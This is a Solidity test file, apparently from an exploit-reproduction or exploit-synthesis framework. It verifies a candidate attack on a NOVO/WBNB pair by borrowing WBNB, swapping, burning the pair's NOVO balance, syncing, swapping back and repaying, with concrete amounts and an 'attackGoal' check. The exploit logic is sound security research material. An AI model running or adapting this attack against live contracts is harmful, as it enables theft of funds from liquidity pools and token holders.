// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./NOVO.t.sol";

contract NOVOVerify is NOVOTest {
    function test_verify_cand002_0() public {
        uint256 amt0 = 0x21a080008000000000000;
        uint256 amt1 = 0x1ffffdaa9000000040253;
        uint256 amt2 = 0xaf277fe1f4b975;
        uint256 amt3 = 0x83a8a;
        uint256 amt4 = 0x21a0800bd303ad38b8001;
        borrow_wbnb(amt0);
        swap_pair_wbnb_novo(amt1);
        burn_pair_novo(amt2);
        sync_pair();
        swap_pair_novo_wbnb(amt3);
        payback_wbnb(amt4);
        require(attackGoal(), "Attack failed!");
    }
}
